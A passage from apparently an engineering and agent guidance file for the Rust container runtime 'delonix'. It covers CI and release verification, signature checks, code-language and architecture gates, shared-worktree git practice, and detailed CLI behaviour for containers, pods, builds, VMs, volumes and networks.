touches what `contract_gate` generates and is its own PR.

**A number of checks says nothing without the SHA it belongs to**, and that bit twice
on the same day (2026-10-08). Once noisily: `mergeStateStatus: UNKNOWN` with the
`headRefOid` stuck on the commit from before a rebase — the merge was REFUSED. The other
**silent, and that is the dangerous one**: the release PR reported `head=138d96ee` with **18
green checks** and `CLEAN` while the ref was already on the next commit; the 18
belonged to the PREVIOUS commit, and reading «18 pass + CLEAN» as done would have merged the
release with new notes without a single check on them. The PR's `updated_at` was
stalled and the commit list ended on the old commit; a `close` + `reopen` forced the
re-synchronization. The command that makes the rule verifiable instead of a warning:

```bash
gh api repos/<owner>/<repo>/commits/<sha>/check-runs \
  --jq '{total, por_sha: [.check_runs[].head_sha] | unique}'
# → {"total": 20, "por_sha": ["<sha>"]}   a single SHA, and it is the one you want
```

**A workflow that only runs via `workflow_dispatch` is exercised by nothing, and
`release.yml` is that one.** Measured on `main` on 2026-10-08, after #728 and #730
closed the `protoc` drift: **zero** references to `release.yml` in the 18 jobs of
`ci.yml`, **zero** in `scripts/`, **zero** in Rust tests. The only file outside
`docs/` that names it is the action it itself consumes. So the protoc fix
closed the drift BETWEEN the two paths and did **not** close this: a broken reference
in that file only shows up on the next `gh workflow run` — which was exactly how
this release failed the first time, with CI green the whole time.

**And the name deceives, which makes it worse.** `ci.yml` has a job named **`release verify`**
(`release-verify`), and it validates the `system features` maturity table against
rotten file references — nothing from `release.yml`. Whoever looks for «who validates the
release» finds that green check and concludes it is covered. *(Method note: the
first reading of this section gave TWO jobs with the same visible name, because an `awk`
glued two comment blocks together. There are no duplicates — the full id→name list
disproved it. The filter that cuts out what matters, again.)*

**The gate is writable, and there is precedent**: `scripts/test_tmp_roots_gate.py` already READS
`ci.yml` and fails when a step stops running after a failure, and
`scripts/dev_docs.py` also reads workflows. The same idiom applied to `release.yml`
would answer what nobody answers today — that every local `uses:` exists, that the
two build jobs install the toolchain before compiling the contract, that the asset
names `install.sh` composes are the ones the workflow publishes. It is not one line: it is
its own work, and it is written as such instead of implied.

**The glibc floor of the published binary is 2.34, and that is measured — not deduced from the
runner.** Measured across the **15** binaries of v5.0.0 (`readelf -V`, the highest `GLIBC_`
symbol): **2.34 in all**, arm64 and `-v3` included. It is LOWER than the runner's 2.35
(`ubuntu-22.04` and `ubuntu-22.04-arm`), because Rust links against the oldest versioned
symbol it needs and not against the most recent available. Two consequences:
**RHEL 9** (glibc 2.34) is covered — which is the reason the release pins 22.04 instead of
the `ci.yml`'s `ubuntu-24.04-arm`, and it is now measured instead of asserted; and this
number is **the probe** that says whether a runner upgrade, or a new toolchain pin,
dragged the floor. The `protoc` pin did not drag it.

**The validation of the published assets measures five things, and the signature comes from the
REPOSITORY.** The `SHA256SUMS` arrives from the same URL as the binary, so verifying it
with a key that came in the same download proves transfer and not origin: the key
comes from `git show origin/main:scripts/install.sh` (`MINISIGN_PUBKEY`). The five are
integrity (`sha256sum -c SHA256SUMS`, **without `--ignore-missing`** — that flag makes a
MISSING asset read as OK), origin (`minisign -Vm`, whose trusted comment names the
tag and is therefore not reusable from another release), identity (`--version` with the
**commit**, not just the number — `git rev-parse v<t>^{commit}`, never the tag object),
completeness (the matrix that `install.sh` composes: **5** siblings × **3** variants = 15,
plus `install.sh`/`SHA256SUMS`/`.minisig`/vsix/SBOM) and architecture (`file(1)` per
binary — an `aarch64` asset cannot be an x86 with the name swapped). Two cheap extras
that are worth it: the published `install.sh` is `cmp`'d against the tag's, and the `-v3` is
genuinely v3 (`file` says `x86-64` on both; what separates them is the code —
**134,561** AVX2/BMI2/FMA instructions against **5,911** in the baseline).

**The cost, said because it is the cost**: a tag without a release becomes a normal
intermediate state, and the `version_gate` above still looks at the TAG and not
at the release — therefore the `Cargo.toml` `version` is aligned at the moment the
tag is made, not at the moment someone runs the workflow.

It also fails on **a branch that does not contain the most recent tag**: it started before that
release and merging it as is undoes what that release published. Merge
`origin/main` into the branch first.

Since the number stays the same between releases, `--version` says the distance:
`commit: a3aa776fa (+51 commits since v3.1.0)`. Measured before: a build of `main`
answered `delonix 3.1.0` with 45 commits that no release published — the
trap «two builds with the same version are not the same build».

**Avoid regressions and conflict with the past, at the start of each task**:
`git fetch --tags origin`, branch off `origin/main`, know which is the last tag and
how many commits `main` has after it, and read the history of the area you are going to
touch (`git log -- <path>`, and this file's section that describes it) before
proposing. What has already been decided, fixed or removed is not redone out of
ignorance.

## Code language: English (LANG-01)

**Identifiers, comments and messages are written in English.** Portuguese
serves the operator, and reaches them through the translation catalog (`cmd::po`), never through
a string written by hand in the middle of the code.

This is not a new policy — it is the policy the repo already had and never
enforced. The CLI `help` is authored in English and translated to PT since
v0.32.2; everything that stayed in Portuguese stayed by having **skipped** the catalog.

**The gate:** `scripts/lang_ratchet.py` counts three debts — identifiers,
comments and user-facing messages still in PT — against
`scripts/lang_baseline.json`, and runs in CI (job `lang`).

It is a **ratchet, not a ceiling**, just like the `ARG_HELP_PENDING` of
`help_i18n_tests`: it fails if the number GOES UP (new Portuguese entered) **and** if it
GOES DOWN without the baseline having been lowered in the same commit. A `<=` would leave the
debt reading green forever.

```bash
python3 scripts/lang_ratchet.py --list --only identifiers   # what is left
python3 scripts/lang_ratchet.py --update                    # lower the base
```

When translating, `--update` and the translated file go in the **same commit**.

**The lexicon (`scripts/lang_pt_lexicon.txt`) carries no homographs.** `remove`,
`media`, `data`, `base`, `no`, `so`, `ate`, `ver`, `pos` and `seg` exist in both
languages. `nas` was worse: it collides with **NAS**, the storage, and on the first
pass gave six false positives that made already-English comments count as
debt. A counter with false positives is not a counter — it is noise with a
number in front of it.

**`num` STAYS, and the measurement decides — not the intuition.** It is a homograph («num» =
«em um» in PT, abbreviation of *number* in EN) and the rule above suggests removing it.
Measured on 2026-08-25, running the ratchet with and without it: depending exclusively
on `num` are **20 hits** — comments 3479→3465, identifiers 1050→1044. Read one by one,
**11 are false positives** (`num`/`num_ok`/`cap_num`/`StringOrNum`, and four
ENGLISH comments that cite `cap_num`) and **9 are genuine Portuguese** («num
runner LIMPO», «num apply falhado», «Só num manifesto»).

It is not the case of `nas`, which gave six false and zero real. Here removing it loses 9
real detections to eliminate 11 false ones, and forces lowering the baseline
by 20 — a permanent slack for twenty new PT hits to enter without the gate noticing
it. It stays as is.

What is safe is **not to write new identifiers named `num`**: a
`format!("{num:04}")` counts as Portuguese debt. `number` or `count` do not have
the problem, and are better English all the same.

Adding a word to the lexicon **raises** the count and makes the gate fail. That is
correct: it means debt that was already there was discovered. Lower the baseline
in the same commit in which you add the word.

**An ENGLISH comment that cites a file with a Portuguese name counts as debt**
— and the case that exists is `docs/measured-comparison.md`, whose name carries `medida`,
which is in the lexicon. `is_pt_text` accepts ONE word as proof, and does not distinguish
prose from path. Caught on 2026-09-23 while writing the M11 gate, in two lines
that were pure English.

**The detector was not touched, and the measurement decided** — the same discipline as
`num`: of the 3,344 comments counted as PT, **2** stop being so if
file paths are ignored. Noise. A path filter in
`is_pt_text` is new code in a shared gate to fix 0.06% of the count,
and would have to come with the baseline lowering in the same commit.

What you do when it happens: the path reference goes into a **docstring**
(the ratchet reads `#` in `.py` and `.yml`, not docstrings) or into another place the
gate does not count, and the comment in place points there. The reference is never
deleted — it is what makes the claim verifiable.

## The direction of dependencies is a gate (ADR-0040, phase P0)

`scripts/arch_fitness.py` enforces the structure ADR-0040 decided, and it entered
**before** any crate moved — a restructuring without rails
regresses while it happens, and nobody notices until the end.

Each crate has a **layer** declared in the `LAYERS` table (by TODAY's name; the
table changes in the phase that renames each one), and the allowed direction is in a single
place, `ALLOWED`: the foundation only depends on the foundation, a context does not depend on
adapters, an adapter does not depend on interfaces, and **a binary composes ONE
interface** — it is this last one that prevents `delonix` from loading four
servers again while the servers call it again by subprocess.

**An exception has to name the phase that removes it.** An exception without a phase fails the
gate, and an exception that no longer applies also does — that is how a temporary
tolerance stops being permanent. Today there are ten, and each one says its phase (the
`--list` shows them).

**The directory is the layer** (P0 closure, ADR-0040 D2.5):

```
crates/foundation/   delonix-model, delonix-net-rules
crates/contexts/     delonix-stack, delonix-compute, delonix-networking, delonix-storage, delonix-node, delonix-security-runtime
crates/adapters/     delonix-linux, delonix-sdn, delonix-oci, delonix-scanner, delonix-state, delonix-volume, delonix-vm, delonix-telemetry, delonix-pool-helper, delonix-warm
crates/providers/    delonix-proxmox, delonix-truenas, delonix-opnsense, delonix-powerdns
crates/interfaces/   delonix-cri, delonix-mgmt, delonix-mcp
bins/                delonix-runtime-bin, delonix-mcp-bin, delonix-mgmt-bin
```

The crates moved places **without changing name** (the renames are in phases P2–P4).
Each crate's path is written once, in `[workspace.dependencies]` at the root, and
each crate depends on the others via `{ workspace = true }` — moving or renaming is one line.
The gate rejects a crate whose directory is not that of the layer declared in `LAYERS`, in
both directions: changing the layer without moving, or moving without changing the layer. A new crate
enters the `LAYERS` table and that layer's directory in the same commit.

**The dependency versions live only at the root** (`[workspace.dependencies]`). A
member crate writes `{ workspace = true, features = [...] }` and nothing else; the
`default-features = false` stays at the root because a member cannot turn it off
if the root turns it on. The gate rejects a version written in a member. Measured when
moving the 32 that were scattered: `Cargo.lock` byte for byte equal and the tree of
resolved features (`cargo tree -e features,normal,dev,build`) identical.

Two numbers are **ratchet**, with the same semantics as `lang_ratchet.py` (it fails
if it GOES UP and fails if it GOES DOWN without the baseline lowering in the same commit):

- **`self_exec_sites`** — how many times a library runs the engine's
  binary again instead of calling a function. It is the cycle hidden behind a
  process: the `-bin` links the CRI, the `mgmt` and the MCP, and the three run the
  `-bin` again. Each of these sites becomes a call to a use case, or a typed spec
  handed to the launcher.
- **`library_prints`** — `println!`/`eprintln!` in library crates. A
  library does not write to the terminal; it emits `tracing`, and whoever prints is the
  interface.

`Command::new` is **not** counted: an adapter exists precisely to call
`ip`, `nft`, `qemu-img` or `ssh`. What is counted is the engine re-executing
its OWN binary.

## Method: one worktree per session (read BEFORE editing)

**Several sessions write to this clone at the same time.** It is not a hypothesis: measured on
2026-08-12, the `main` HEAD changed **four times** during a single session, three sessions
committed in the same interval, and two regenerated the SAME `docs/guia-vm.html` minutes
apart. Alongside, `git worktree list` had **eight** live worktrees, several from sessions long
closed. Therefore:

1. **Create the worktree before the first edit**, in
   `<workspace>/.worktrees/delonix-runtime/<task>` and **never in `/tmp`**, from the
   **right base by classification** (`origin/develop` for feat/chore/…, `origin/main`
   for fix/bug/hotfix — see [`docs/dev/engineering-process.md`](docs/dev/engineering-process.md)):
   `python3 scripts/gitflow.py start <prefix>/<task>` does it (fetch + base + worktree +
   contract), or by hand `git worktree add -b <branch> <path> origin/<base>`, with
   `CARGO_TARGET_DIR=<repo>/target` to reuse the build cache.
   `/tmp` is emptied at every boot, and this machine reboots: on 2026-09-16 a reboot
   took five integration worktrees in the middle of a stack of PRs; nothing was lost only because
   the branches were already pushed. The `.worktrees/` stays outside this repo and is already ignored
   by the harness's `.gitignore`. **Long work: commit and push the branch early and at every
   step with value**, and logs of long builds outside `/tmp` — a persistent worktree
   protects against the reboot, a pushed branch protects against everything else.
2. **At the end**: commit in the worktree → PR to `develop` with **squash + green CI**
   (`python3 scripts/gitflow.py integrate --execute`) → confirm inclusion by
   `git cherry develop <branch>` before cleaning up (only for a branch of ONE commit —
   see the trap above; for several, prove it by content). A clean cherry-pick/rebase does **not** prove
   it compiles: the base changed since the worktree branched, so the gates run AGAIN
   after the rebase onto `origin/develop`.
3. **Remove BOTH things**: `git worktree remove <path>` **and** `git branch -d <branch>` —
   the branch outlives the worktree, and that is how the garbage becomes invisible.
   `python3 scripts/gitflow.py cleanup <branch> --execute` does it safely (it refuses if
   there is unintegrated work or uncommitted changes).

Three measured traps, all with real cost:

- **A conflict in `AGENTS.md` is the norm, not the exception** — several sessions append to the same
  list («X is not Y») and to the end of the file. Resolve by **keeping both sides**: they are distinct
  entries, and choosing one erases someone else's finding.
- **`git checkout -- <path>` in the shared tree destroys someone else's WIP** (it reverts to the HEAD,
  without warning and without stash). It happened in `docs/` in this session; nothing was lost by luck, because the
  other session had already committed.
- **`git add -A`/`-u`/`.` absorbs another session's work.** `git add <file> <file>`,
  always, and recognize each file in `git status --short` as your own before committing.

A push rejected for divergence is resolved with `git pull --rebase` — this repo has a linear
history and takes no merge commits.
## CLI (`delonix`)

The `delonix` binary (crate `delonix-runtime-bin`) is the complete open-source CLI of this engine —
counterpart to Docker, distinct from the private `delonix`/`delonixctl` of `delonix-paas` (another
repo/branch/remote, unaffected by anything here). Commands are grouped semantically rather than as
a flat list, one module per group under `bins/delonix-runtime-bin/src/cmd/`:

- `delonix init` (v0.47.0) — the step BEFORE `stack init`/`vm init`: it looks at the directory,
  decides which of the two to call and with which of the eleven templates, and **delegates** (generates nothing of its own).
  `cmd/init.rs::detect` is pure over the file names present, ordered from the most specific
  to the most generic — a Django also has `.py` and a Next.js also has `package.json`, so
  the broader rule cannot win just by being checked first. **It always explains itself**
  (`detected go.mod → stack init --template go`): a wrong guess that you can see is fixed
  with `-t`, a silent one produces a project that does not match the code next to it. A
  `VMfile` routes to `vm init`; a `docker-compose.yml` is the case where the right answer is
  **to generate nothing** (it already runs natively with `delonix compose up`, and a 2nd manifest would give it
  two sources of truth) — it warns, instead of generating anyway. `delonix version` exists alongside the
  flag because `<tool> version` is what you type first (git/docker/kubectl/podman
  all respond), and it prints the flag's text VERBATIM so the two cannot diverge.
- `delonix container` — run/ps/stop/rm/exec/logs/**update**/**describe**/**kill**/**wait**/
  **restart**/**rename**/**port**/**attach** (v0.25.0, Docker/Podman CLI-verb parity). `kill -s
  <signal>` sends an arbitrary signal (name or number) without forcing a `Stopped` status — the
  real outcome (`Crashed` for anything that actually terminates the process) is picked up on the
  next observation, same as any other unexpected death; `wait` blocks and prints the real exit
  code for **any** detached container: `run -d` always forks a supervisor
  (`should_supervise = detach && forkable`), and only the real parent can `waitpid`. The sentence
  that stood here ("only with a `--restart` supervisor") described the PREVIOUS decision, and it
  stayed true for `start`/`restart` longer than it should have — those kept re-creating the process
  with nobody watching unless a restart policy happened to be set, so `run -d … 'exit 7'` gave
  `wait` = 7 while the SAME container, after a `container start`, answered "exit code … was not
  captured". Measured 2026-09-10 and fixed by pointing `start` at the same question `run` asks.
  **And a REQUESTED stop is never a crash**: the supervisor honours `stopped_by_user`, so a `stop`
  that needs SIGKILL — the ordinary case, since a PID 1 with no SIGTERM handler does not die on it
  — ends `Exited (0)` and not `Dead`, and `wait` answers **0**. `stop` also persists through
  `update` and no longer through `save`: `save` rewrote the whole record from a copy read BEFORE
  `cmd_stop` set that flag, and with it a `stop` on a `--restart always` container was undone by
  its own supervisor four seconds later. `exec -e/-w/-u` are per-call overrides (never persisted); `exec -w`
  also fixed a real bug found while adding it — `exec` used to hardcode `chdir("/")`
  unconditionally, ignoring the container's own configured `workdir` even with no `-w` at all.
  `logs --tail/--since/--timestamps` only work for containers run with `--log-cri` (the only log
  format with real per-line timestamps to filter/show — a clear error otherwise, never a silently
  blank column). `attach` is deliberately **output-only**: this engine keeps no live stdin
  conduit to an already-started detached container (no persistent per-container shim like
  containerd's), so `-i` is refused with a clear error pointing at `exec -it` instead. **Angolan default
  name**: without `--name`, the container is called `<king>-<place>-NN` (e.g.:
  `njinga-benguela-07`) — lists shared with kind-mode in `cmd/names.rs`;
  DETERMINISTIC from the id (the 2 passes of the `--net` re-exec converge without transport),
  a collision advances to the next combination, `dlx-<id>` only as a last resort. `run` accepts `-v/--volume` (named or bind
  mount, via `delonix-volume::VolumeStore::resolve_spec`, tested and functional) and
  `--net host|none|<network>`. `host`/`none` — original behaviour, unchanged, tested. `--net
  <custom-network>` **WORKS in rootless** via the **`nsenter … ip netns exec` re-exec** (the old
  note said it did not exist — IT WAS OUTDATED): `infra::attach_container` creates the NAMED netns
  on the holder side and `reexec_into_netns` (`cmd/container.rs`) re-executes the binary via
  `infra::join_argv` (`nsenter -t <holder_pid> -U -m -n … ip netns exec <netns>`); the 2nd pass
  runs with `RunSpec.inherit_userns` (suppresses `CLONE_NEWNET`/`CLONE_NEWUSER`, inherits the holder's —
  the process gains privilege in the holder's userns). The `RunSpec.join_netns` via `setns`
  (which failed with "pod netns unavailable") is **dead code** — abandoned in favour of the
  re-exec. **`--pod <netns>`** uses the SAME mechanism to join N containers to the shared netns
  of a pod (see `delonix pod` / `kind: Pod` below). **Real GPU via CDI (v0.28.0)**: `--gpus
  nvidia|all` and `--device nvidia.com/gpu=<name|all>` (`cmd/cdi.rs`) — CONSUMES CDI specs already generated
  by `nvidia-ctk cdi generate` (`/etc/cdi`/`/var/run/cdi`), never does driver discovery
  on its own (that stays 100% inside `nvidia-ctk`, just like in real Docker/Podman/containerd).
  It is deliberately NOT the legacy hook model `nvidia-container-cli configure --pid=<pid>`
  (a 2nd process doing `setns` into ANOTHER's userns/mntns by PID — it would need
  `CAP_SYS_ADMIN` in that foreign userns, the same cross-namespace privilege problem that
  `--net <custom-network>` already solves via re-exec, not via external attach): the spec's `deviceNodes`/
  `mounts`/`env` translate to the SAME `Vec<Mount>`/`Vec<String>` that `-v`/`--device`
  already feed, applied by the container's OWN init before the `pivot_root` — zero new privilege
  model, the same ever-rootless mechanism as always. Without a CDI spec or `nvidia-ctk` on the
  PATH, `--gpus nvidia`/a `--device nvidia.com/gpu=...` **refuses with a clear, actionable error**
  BEFORE creating anything (never silently falls back to the raw bind of `/dev/nvidia*`, which would fail
  midway with a confusing CUDA error). `ldconfig -r <rootfs>` best-effort right after the mounts in
  `setup_rootfs` (still before the `pivot_root`) — a deliberately simpler substitute for the real
  `createContainer` hook of a CDI spec (which needs the OCI-hook-stdin-state protocol, not
  implemented); a spec that declares hooks warns (not silently) that they were not executed.
  `--gpus dri` remains unchanged (raw bind of `/dev/dri/*` — Mesa/VAAPI is open-source, already ships
  in the image's own package). **MEASURED on a real GPU host on 2026-11-21** — see "The CDI path
  measured on a real GPU host" below: `ldconfig -r` DOES suffice for the CUDA path, and
  `/var/run/cdi` wins over `/etc/cdi`. What stays unmeasured is anything beyond CUDA (Vulkan/EGL,
  which may need the symlinks the hooks create).
- `delonix pod` — **real multi-container pods** (create/ls/describe/rm/logs/exec/cp/attach). N containers
  share the **pod's netns** (same IP, `localhost` between them), like a k8s Pod. `cmd/pod.rs`:
  creates a NAMED SDN netns on the holder (`pod-<name>`, via `infra::attach_container`) and runs each
  container with `--pod pod-<name>` (the re-exec above) + label `delonix.io/pod=<name>`. **Membership
  without a new store** — state derives from the labels (`Store::list`), like `cluster`/`stack`. `rm`
  removes all members + `detach` of the netns. It reuses the k8s→docker normalization from
  `kind: Container` (`container::container_to_run_opts`/`pod_member_run_opts`); `kind: Container`
  still accepts ONLY 1 container (>1 → use `kind: Pod`). **`kind: Pod`** in the manifest (same
  schema `PodSpec`, N containers) + `pods:` group in `kind: Stack` + `--dry-run`. **It also plugs the
  gap in CRI root-mode** (`delonix-cri` was calling `delonix pod create/rm`, which did not exist).
  **Namespace sharing**: **netns** (Phase 1) + **IPC + UTS** (Phase 2) — the 1st container holds
  the ipc/uts and the rest join via `RunSpec.pod_infra_pid` (the `spawn` suppresses
  `CLONE_NEWIPC/NEWUTS`, `container_init` does `setns` of `/proc/<pid>/ns/{ipc,uts}`); possible in
  rootless because the `--pod` re-exec already places them in the holder's userns, where `setns` has privilege (the
  reason the old `setns` — `join_netns`, now removed — failed no longer holds).
  **PID** (`shareProcessNamespace`, field already in the schema) is Phase 3.
  **`exec`/`cp`/`attach` day-2** — a pod member is a normal entry in the container `Store`
  (`<pod>-<member>`, from `pod_member_run_opts`), so `container
  exec/cp/attach <pod>-<member>` already worked end-to-end before this; what
  was missing was the pod-relative UX (`pod exec <pod> --container <short>`, in the style of
  `kubectl exec <pod> -c <container>`). They are thin wrappers: `cmd/pod.rs::resolve_target`
  picks the member (`--container` by short name, or the first by default) and delegates
  to `container::cmd_exec`/`cmd_cp`/`cmd_attach` (made `pub(crate)`), zero new
  engine. `pod cp` reuses the `<name>:/path` convention from `container cp`
  (`split_cp_arg`), replacing the POD name with the member's REAL name before
  delegating. `pod port-forward` is left out — it needs a new
  host-process↔pod-netns forwarder, not a delegation.
- `delonix image` — pull/ls/rm/export (OCI bundle for `runc`/`crun`).
- `delonix build -t <tag> [-f Dockerfile|Delonixfile] [context]` — the only group with new
  orchestration (the others have a ready API in the crates, this is "wiring the wires"): it brings up a worker
  container (`sleep infinity`) PER STAGE, runs each `RUN` via `exec`, applies `COPY` to the rootfs on
  disk, and packs with `ImageStore::commit_flat_rootfs` (rootless) or `commit_upper`+`build_image`
  (root). **Multi-stage** (`FROM ... AS <name>` + `COPY --from=`) supported — only root mode
  (overlay) requires the FINAL stage to be a real image (no OCI lineage for a cloned
  stage). **Per-instruction layer cache** (rootless only, `--no-cache` to skip). **`--secret
  id=<name>,src=<path>`** + **`RUN --mount=type=secret,id=<name>[,target=][,required=]`** —
  LIVE bind-mount (`runtime::mount_live`/`unmount_live`, the same primitive as `container update
  --volume-add`) only during that `RUN`'s window; because the mount lives only in the worker
  container's own mount namespace, the secret is never visible from the host side that
  `commit_flat_rootfs`/cache reads — structurally it cannot reach a layer. Validated live:
  value read during the `RUN`, absent (not even an empty file) in the final image. `type=ssh`/
  `type=cache`/`type=bind` give a clear error (never become literal shell text). **`--platform
  linux/<arch>`** — resolves the base image for the requested arch (`resolve_or_pull_platform`, arch-aware:
  it only reuses a local image if the stored `config.architecture` matches), stamps it on the
  result; clear preflight against `/proc/sys/fs/binfmt_misc/qemu-<arch>` before starting a
  cross-arch build (the binfmt/qemu-user-static itself is a HOST prerequisite, not managed by
  this engine — the same principle as `docker run --privileged tonistiigi/binfmt` from real buildx).
  **`Delonixfile`**: without `-f`, `default_build_file` (`cmd/build.rs`) looks for `<context>/
  Delonixfile` before `Dockerfile` — same grammar (`parse_dockerfile` already supports the Delonix
  extensions `SCAN`/`CPUS`/`MEMORY`/`SECURITY`/`HEALTHCHECK` regardless of the file name);
  `Delonixfile` is just the canonical default name.
- `delonix vm` — create/ls/stop/rm/status, flags 1:1 with `delonix_vm::VmConfig`.
  **`ls --namespace <ns>`** filters by the isolation namespace and is the only way to READ it
  in this listing: the `NAMESPACE` column hides itself (`drop_uninformative`) when every
  row would say `default`, so passing the flag prints the value as-is.
  **`prune` is NOT `container prune`.** By default it takes only what nothing references — stale
  creation locks, sockets/pid/console of VMs that no longer exist, overlays with no record — and
  leaves every declared VM alone, stopped ones included. The reason is measured: on the machine where this was
  written the 17 VMs were ALL stopped, and Docker's semantics would have deleted the whole
  lab. The reachability test is what matters — `vms/` had `hadata`,
  `labdata` and `pbs`, three folders with **53 GiB of LIVE disks** cited by the `.xml`/`.json` of
  existing VMs, and none with a VM's name; a by-name sweep would have called them orphans.
  `--stopped` opts into the destructive behaviour, and says in the preview how many machines it takes.
- `delonix cluster prune [NAMES]...` — the state of clusters that no longer have a single node. A
  cluster exists as long as there are containers with the label `io.x-k8s.kind.cluster` (`cluster
  ls` derives it that way, with no store of its own), so nodes removed by another path leave
  behind the folder, the kubeconfig and — which is not cosmetic — the context in `~/.kube/config`
  pointing to a port that may by now belong to something else. Without names it collects all
  orphans (the usual behaviour); **with names it collects only those**, and a name that is not an
  orphan is REFUSED by name — collecting zero and saying `removed: 0` reads like a typo that
  means "it was already clean". A cluster WITH nodes, even stopped, is never touched.
  **And "nodes" counts VMs** (`cluster::is_cluster_vm`, which also sees the `-lb`/`-etcd<N>`): a
  `mode: vm` cluster has no container with a label, so reading only containers made
  every live VM cluster look like leftovers — and what lives in `<root>/clusters/<name>/` is the SSH
  KEY that `cluster kubeadm` generated. Measured 2026-10-15 with the `main` binary: a `cluster
  prune -f` deleted the `id_ed25519` of a cluster that was up.
- **An orphan is reachable by name.** `delete clusters <name>` and `cluster destroy <name>`
  resolve via on-disk state when there are no nodes (`kindmode::delete_without_nodes`), instead of the
  `DX-4000 no such cluster kind` that forced a manual `rm -rf` plus a `kubectl config
  delete-context`. In the read-only verbs (`health`, `describe`, `stop`, `start`) the refusal
  now says which of the three cases it is (`kindmode::unresolved`): a cluster provisioned on VMs,
  a cluster with no nodes but with on-disk state, or a name that is no cluster at all here. A name with
  live VMs never enters via the orphan path — that would delete the access key to what is up.
- `delonix stack prune -f <manifest>` — the pruning half of `apply --prune`, isolated: it removes
  what the stack owns and the manifest no longer declares, without creating or converging anything. It builds the same
  plan as `apply` and keeps only its `Delete` changes, so there is not a second notion of
  ownership diverging from `destroy`. Like `destroy` and unlike the other `prune`s, it asks
  nothing — the manifest is the authorization, and `--dry-run` is the preview.
- `delonix system prune` — the global sweep. **`--auto --threshold N` is the SCHEDULED mode**:
  it measures the occupancy of the file system that holds the state and, below the threshold, exits at 0
  without having touched anything — that is success, not a nothing-done to fix. The gate runs
  BEFORE opening any store. `--auto` implies `--force` (nobody is there to answer a
  prompt on a timer) and **never touches volumes** — for those the path is `volumes prune
  --namespace`. The percentage is the one from `df` (`used/(used+bavail)`, rounded up), and
  not the naive `(blocks-bfree)/blocks`: the latter counts the blocks reserved for root as
  free and gives ~5% less, which is exactly the distance between the GC threshold (75) and the
  thin pool alert (80). If occupancy cannot be read, it **refuses** instead of
  guessing. It is the command that the `delonix-deploy` role `store_gc` schedules — and which until here
  did not exist: `delonix prune --auto` returned exit 2, `unrecognized subcommand`.
- `delonix volume` (renamed from `volumes` in B2) — create/ls/rm/inspect, a thin wrapper over `VolumeStore`.
  **`prune` is SCOPED BY OWNER** (`prune::Scope`): with no flags it sweeps only the ownerless root — what
  it always swept — and at the end SAYS which namespaces it did not look at; `--namespace <ns>` sweeps a
  tenant (it is the tenant-teardown primitive), `-A/--all-namespaces` sweeps everything. A tenant's
  volume lives in `volumes/.ns/<ns>/<name>` and `VolumeStore::list` does NOT see it by design —
  whoever has to account for the whole store uses `list_all`, which returns the owner attached to each
  record. **The scope limits what gets TAKEN, never what gets LOOKED AT**: a share is registered in
  the tenant's sub-tree but the parent volume stays at the root, with the share's data INSIDE the parent's
  tree — filtering before the parent/child derivation would make `--namespace <t>` delete data on the NAS.
  - **`delonix storage`/`delonix sharevolume` no longer exist as top-level groups (CLI B5
    merge, complete).** They had been shrinking over several sessions — `storage` reached this merge only
    with `create`/`ls` (the rest had already fallen into `volume dash`/`rm`/`inspect`), and the module
    itself said in writing what was missing: "Cutting either would need new capability built into
    `volume` first". This session built that capability: `volume create` gained `--type
    <nfs|cifs|smb|webdav> --server … --share … [--username --password --password-secret
    --read-only]` (the same friendly declaration that `storage create` had, calling directly
    into the `pub(crate)` helpers in `storage.rs` — `share_mount`/`ensure_share_credentials` —, which
    remain as the mount logic shared with the manifest path) and `--parent <volume>
    [--namespace <ns>]` (a share — what `sharevolume` covered — delegating to
    `sharevolume::apply_share`, the SAME function the `share:` manifest already called, so the two
    paths can never disagree). `volume rm` gained `--purge-data` (refused on a volume without
    `--parent` — its own removal already takes the data) and `volume ls`/`describe` gained
    `PARENT`/`QUOTA`/`ALERT` (with `-A/--all-namespaces` in `ls`, so a share is never
    invisible — the same guarantee that `sharevolume ls` always gave).
  - **Reading a share no longer needs a separate `ShareRecord` type.** The old
    `sharevolume.rs` had `load_record`/`list_all` checking FOUR places (namespaced volume,
    namespaced JSON record, global volume, legacy JSON record) so a share
    could have been created before OR after the v0.53.x merge that already turned it into a `Volume` with
    `.parent`. That double read existed only to read pre-merge `ShareRecord` records never
    migrated — the `sharevolume migrate` command that resolved that was removed alongside (user
    decision: real installations have had time to run `migrate` on an earlier binary).
    Without that fallback, a share IS just a `Volume` with `.parent` — `volume ls`/`describe`/`rm`
    read it directly from `VolumeStore`, with no intermediate type at all. **BREAKING**: a
    `ShareRecord` record never migrated (prior to v0.53.x) is no longer read — whoever is in that
    state must run `sharevolume migrate` on a binary earlier than this version before
    upgrading.
  - **A share's `--purge-data` needed no new mechanism**, only a flag: `VolumeStore::
    remove_with` already documented (and the audit confirmed by reading the code) that it never touches the
    `mountpoint` of a volume registered by `register_external` — it lives outside the `dir(name)` that the
    function deletes — so "preserve by default" was already the behaviour; `--purge-data` only
    adds the `remove_dir_all`+fallback `remove_tree_mapped` that `sharevolume rm --purge-data`
    already had, now in `cmd_rm_with`.
- `delonix network` — ls/create/rm/inspect. **Two stores in parallel, deliberate**:
  `NetworkStore` (rich declarative record — bridge/macvlan/ipvlan/overlay drivers) and
  `infra::{network_create_with,network_remove}` (physical plane of the rootless holder netns).
  **The bridge name has ONE formula, `delonix_sdn::bridge_name`, and the physical plane is the
  authority** — it is the `NetDef` that names the device the holder creates, and the `NetworkStore` only
  REPORTS it (`ls`/`inspect`/`describe`). It had its own (`dlxn{base:02x}{hash:04x}` versus
  `dlxn{hash:08x}`) and printed a device that does not exist on the host — measured in `lab-net`:
  `dlxne9623e` on the CLI, `dlxn0536623e` in the netns. Same family as `ingress ls` saying `allow` about
  a blocked port. Nothing to migrate: the `NetworkStore` bridge is recomputed on every `get` (the
  record stores `base=`), unlike the `NetDef`, which persists it. For the
  `bridge` AND `overlay` drivers, `network create` orchestrates the two together — `overlay` brings up
  the physical plane on the holder (bridge + VXLAN uplink `dlxvx<vni>` mastering it + peers' FDB +
  WireGuard if encrypted, see `realize_overlay`/`infra::set_vxlan`), because it is realizable without
  host privilege (it all lives in the holder's netns). Proven live: `network create --driver
  overlay --vni 42 --peer …` creates the VXLAN device (`id 42 dstport 4789 nolearning`, master on
  the bridge) and seeds the FDB with the peers — validated up to the single-node boundary (inter-node
  forwarding requires a 2nd real node, not testable in the sandbox).
  **The peer list converges in BOTH directions, and the hole was TRIPLE** (v0.53.x): the
  `converge` only knew to WARN that removal was not implemented, and the warning covered the `peers=`
  record — but there also remained the `00:00:00:00:00:00 dst <ip>` entry in the **FDB** (it is what makes
  this node flood out there) and, in an encrypted overlay, the **WireGuard peer**, i.e. a node already
